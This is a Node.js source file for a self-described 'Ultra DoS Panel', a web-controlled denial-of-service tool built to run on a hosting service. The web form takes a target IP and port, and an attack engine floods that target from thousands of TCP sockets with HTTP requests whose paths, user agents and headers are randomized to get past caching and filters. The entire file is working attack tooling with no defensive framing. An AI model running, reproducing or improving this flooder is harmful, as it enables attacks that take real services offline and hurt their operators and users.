// server.js - Ultimate DoS Attack Panel for Render
// Run: node server.js (port 3000 by default, uses process.env.PORT)

const http = require('http');
const net = require('net');
const url = require('url');

// ---------- GLOBAL STATS ----------
const stats = {
  running: false,
  totalRequests: 0,
  totalBytes: 0,
  activeSockets: 0,
  failedConns: 0,
  startTime: 0,
  target: '',
  duration: 0
};

let stopAttack = false;
let attackSockets = [];

// ---------- BUILT-IN HTML (with stats polling) ----------
const htmlPage = `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>ULTRA DOS PANEL</title>
  <style>
    body { background: #0a0a0a; color: #00ffcc; font-family: 'Courier New', monospace; padding: 20px; }
    .container { max-width: 750px; margin: auto; background: #111; padding: 25px; border: 1px solid #00ff88; border-radius: 10px; }
    h2 { color: #ff3366; text-shadow: 0 0 10px #ff3366; }
    label { display: inline-block; width: 140px; color: #aaa; }
    input { width: 200px; padding: 8px; margin: 6px 0; background: #222; border: 1px solid #00ff88; color: #fff; border-radius: 4px; }
    button { background: #ff0033; color: #fff; padding: 14px 40px; border: none; border-radius: 6px; font-size: 18px; cursor: pointer; font-weight: bold; width: 100%; }
    button:disabled { background: #444; cursor: not-allowed; }
    #stats { margin-top: 20px; background: #1a1a1a; padding: 15px; border-radius: 6px; font-size: 14px; line-height: 1.8; }
    .stat-line { display: flex; justify-content: space-between; border-bottom: 1px solid #222; padding: 4px 0; }
    .stat-value { color: #00ffaa; font-weight: bold; }
    .running { color: #ff4444; animation: blink 0.5s infinite; }
    @keyframes blink { 50% { opacity: 0.3; } }
  </style>
</head>
<body>
<div class="container">
  <h2>⚡ ULTRA DOS PANEL</h2>
  <div><label>Target IP:</label><input type="text" id="ip" value="127.0.0.1"></div>
  <div><label>Port:</label><input type="number" id="port" value="80"></div>
  <div><label>Sockets:</label><input type="number" id="sockets" value="3000"></div>
  <div><label>Duration (sec):</label><input type="number" id="duration" value="60"></div>
  <div><label>Req per socket:</label><input type="number" id="reqPer" value="9999999"></div>
  <button id="startBtn">🔥 LAUNCH ATTACK</button>
  <div id="stats">
    <div class="stat-line"><span>Status:</span><span id="statusText" class="stat-value">IDLE</span></div>
    <div class="stat-line"><span>Target:</span><span id="targetStat" class="stat-value">-</span></div>
    <div class="stat-line"><span>Total Requests:</span><span id="reqStat" class="stat-value">0</span></div>
    <div class="stat-line"><span>Total Bytes:</span><span id="bytesStat" class="stat-value">0 MB</span></div>
    <div class="stat-line"><span>Active Sockets:</span><span id="socketStat" class="stat-value">0</span></div>
    <div class="stat-line"><span>Failed Conns:</span><span id="failStat" class="stat-value">0</span></div>
    <div class="stat-line"><span>Elapsed:</span><span id="timeStat" class="stat-value">0s</span></div>
    <div class="stat-line"><span>RPS:</span><span id="rpsStat" class="stat-value">0</span></div>
  </div>
</div>
<script>
  const startBtn = document.getElementById('startBtn');
  function updateStats() {
    fetch('/stats')
      .then(res => res.json())
      .then(data => {
        document.getElementById('statusText').textContent = data.running ? 'ATTACKING' : 'IDLE';
        document.getElementById('statusText').style.color = data.running ? '#ff4444' : '#00ffaa';
        document.getElementById('targetStat').textContent = data.target || '-';
        document.getElementById('reqStat').textContent = data.totalRequests || 0;
        let mb = (data.totalBytes / 1024 / 1024).toFixed(2);
        document.getElementById('bytesStat').textContent = mb + ' MB';
        document.getElementById('socketStat').textContent = data.activeSockets || 0;
        document.getElementById('failStat').textContent = data.failedConns || 0;
        let elapsed = data.running ? Math.floor((Date.now()/1000) - data.startTime) : 0;
        document.getElementById('timeStat').textContent = elapsed + 's';
        let rps = elapsed > 0 ? Math.round(data.totalRequests / elapsed) : 0;
        document.getElementById('rpsStat').textContent = rps;
      });
  }
  setInterval(updateStats, 500);

  startBtn.addEventListener('click', function() {
    const ip = document.getElementById('ip').value.trim();
    const port = parseInt(document.getElementById('port').value);
    const sockets = parseInt(document.getElementById('sockets').value);
    const duration = parseInt(document.getElementById('duration').value);
    const reqPer = parseInt(document.getElementById('reqPer').value);
    if (!ip || isNaN(port) || isNaN(sockets) || isNaN(duration) || sockets <= 0 || duration <= 0) {
      alert('Invalid parameters');
      return;
    }
    startBtn.disabled = true;
    fetch('/start', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ip, port, sockets, duration, reqPer })
    })
    .then(res => res.json())
    .then(data => {
      if (data.status === 'ok') {
        startBtn.textContent = 'RUNNING...';
        setTimeout(() => {
          startBtn.disabled = false;
          startBtn.textContent = '🔥 LAUNCH ATTACK';
        }, duration * 1000 + 3000);
      } else {
        alert('Error: ' + data.message);
        startBtn.disabled = false;
      }
    })
    .catch(err => {
      alert('Request failed');
      startBtn.disabled = false;
    });
  });
</script>
</body>
</html>`;

// ---------- ATTACK ENGINE ----------
function buildRequest(targetIp) {
  const ua = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1'
  ];
  const headers = [
    'Accept-Encoding: gzip, deflate, br',
    'Accept-Language: en-US,en;q=0.9',
    'Cache-Control: no-cache',
    'DNT: 1'
  ];
  const path = '/' + Math.random().toString(36).substring(2, 15) + '?' + Math.random().toString(36).substring(2, 8);
  const uaStr = ua[Math.floor(Math.random() * ua.length)];
  const extra = headers[Math.floor(Math.random() * headers.length)];
  const randHeader = 'X-' + Math.floor(Math.random()*9999) + ': ' + Math.random().toString(36).substring(2, 10);
  return `GET ${path} HTTP/1.1\r\nHost: ${targetIp}\r\nUser-Agent: ${uaStr}\r\n${extra}\r\n${randHeader}\r\nConnection: keep-alive\r\n\r\n`;
}

function startAttack(targetIp, targetPort, socketCount, durationSec, reqPerSocket) {
  if (stats.running) return;
  stats.running = true;
  stats.totalRequests = 0;
  stats.totalBytes = 0;
  stats.activeSockets = 0;
  stats.failedConns = 0;
  stats.startTime = Date.now() / 1000;
  stats.target = targetIp + ':' + targetPort;
  stats.duration = durationSec;
  stopAttack = false;
  attackSockets = [];

  console.log(`[ATTACK] ${targetIp}:${targetPort} | sockets=${socketCount} | req/sock=${reqPerSocket} | time=${durationSec}s`);

  function createSocket() {
    const sock = new net.Socket();
    let connected = false;
    let reqSent = 0;
    sock.setTimeout(5000);
    sock.on('connect', () => {
      connected = true;
      stats.activeSockets++;
      // send in bursts
      function sendBurst() {
        if (stopAttack || reqSent >= reqPerSocket) {
          sock.destroy();
          return;
        }
        const batchSize = Math.floor(Math.random() * 15) + 5;
        let batch = '';
        for (let i = 0; i < batchSize; i++) {
          if (reqSent >= reqPerSocket) break;
          batch += buildRequest(targetIp);
          reqSent++;
          stats.totalRequests++;
        }
        if (batch) {
          try {
            sock.write(batch);
            stats.totalBytes += Buffer.byteLength(batch);
          } catch (e) {
            sock.destroy();
            return;
          }
        }
        if (!stopAttack && reqSent < reqPerSocket) {
          setImmediate(sendBurst);
        } else {
          sock.destroy();
        }
      }
      sendBurst();
    });
    sock.on('error', (err) => {
      if (!connected) stats.failedConns++;
      sock.destroy();
    });
    sock.on('close', () => {
      if (connected) stats.activeSockets--;
      const idx = attackSockets.indexOf(sock);
      if (idx > -1) attackSockets.splice(idx, 1);
    });
    sock.connect(targetPort, targetIp);
    return sock;
  }

  // Launch all sockets
  for (let i = 0; i < socketCount; i++) {
    if (stopAttack) break;
    const sock = createSocket();
    attackSockets.push(sock);
    if (i % 100 === 0) setImmediate(() => {}); // yield
  }

  // Stop after duration
  setTimeout(() => {
    stopAttack = true;
    stats.running = false;
    for (const s of attackSockets) {
      try { s.destroy(); } catch(e) {}
    }
    attackSockets = [];
    stats.activeSockets = 0;
    console.log(`[END] Req: ${stats.totalRequests}, MB: ${(stats.totalBytes/1024/1024).toFixed(2)}`);
  }, durationSec * 1000);
}

// ---------- HTTP SERVER ----------
const server = http.createServer((req, res) => {
  const parsed = url.parse(req.url, true);
  const path = parsed.pathname;

  if (path === '/' && req.method === 'GET') {
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end(htmlPage);
    return;
  }

  if (path === '/stats' && req.method === 'GET') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      running: stats.running,
      totalRequests: stats.totalRequests,
      totalBytes: stats.totalBytes,
      activeSockets: stats.activeSockets,
      failedConns: stats.failedConns,
      startTime: stats.startTime,
      target: stats.target,
      duration: stats.duration
    }));
    return;
  }

  if (path === '/start' && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      try {
        const data = JSON.parse(body);
        const ip = data.ip;
        const port = parseInt(data.port);
        const sockets = parseInt(data.sockets);
        const duration = parseInt(data.duration);
        const reqPer = parseInt(data.reqPer) || 9999999;
        if (!ip || isNaN(port) || isNaN(sockets) || isNaN(duration) || sockets <= 0 || duration <= 0) {
          res.writeHead(400);
          res.end(JSON.stringify({ status: 'error', message: 'Invalid params' }));
          return;
        }
        if (stats.running) {
          res.writeHead(400);
          res.end(JSON.stringify({ status: 'error', message: 'Attack already running' }));
          return;
        }
        // Start in background
        setImmediate(() => startAttack(ip, port, sockets, duration, reqPer));
        res.writeHead(200);
        res.end(JSON.stringify({ status: 'ok' }));
      } catch(e) {
        res.writeHead(400);
        res.end(JSON.stringify({ status: 'error', message: 'Invalid JSON' }));
      }
    });
    return;
  }

  res.writeHead(404);
  res.end('Not found');
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`[PANEL] http://0.0.0.0:${PORT}`);
  console.log('[READY] Configure and launch.');
});
